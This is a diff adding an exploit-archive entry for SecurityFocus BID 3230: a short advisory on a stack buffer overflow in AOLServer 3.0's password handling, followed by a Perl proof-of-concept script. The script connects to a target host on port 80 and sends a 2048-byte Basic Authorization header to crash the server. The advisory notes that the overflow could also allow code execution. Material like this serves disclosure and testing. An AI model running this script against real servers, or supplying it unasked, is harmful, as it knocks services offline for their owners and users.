@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/3230/info
+
+AOLServer is a freely available, open source web server. It was originally written by AOL, and is currently developed and maintained by AOL and public domain.
+
+A problem has been discovered that can allow remote users to crash an AOLServer, denying service to legitimate users of the system. The problem is due to the handling of passwords. It is possible for a remote user to overflow a buffer within the AOLServer process by sending a password of 2048 bytes. This could result in the overwriting of stack variables, including the return address.
+
+This makes it possible for a remote user to execute arbitrary code with the privileges of the AOLServer process, and potentially gain local access.
+
+#!/usr/bin/perl
+
+## Nate Haggard <nate@securitylogics.com>
+## AOLserver 3.0 vulnerability
+## August 22, 2001
+
+use IO::Socket;
+unless (@ARGV == 1) { die "usage: $0 host ..." }
+$host = shift(@ARGV);
+$remote = IO::Socket::INET->new( Proto     => "tcp",
+                                 PeerAddr  => $host,
+                                 PeerPort  => "http(80)",
+                                 );
+unless ($remote) { die "cannot connect to http daemon on $host\n" }
+
+$junk = "X" x 2048;
+$killme = "GET / HTTP/1.0\nAuthorization: Basic ".$junk."\r\n\r\n";
+$remote->autoflush(1);
+print $remote $killme;
+close $remote;
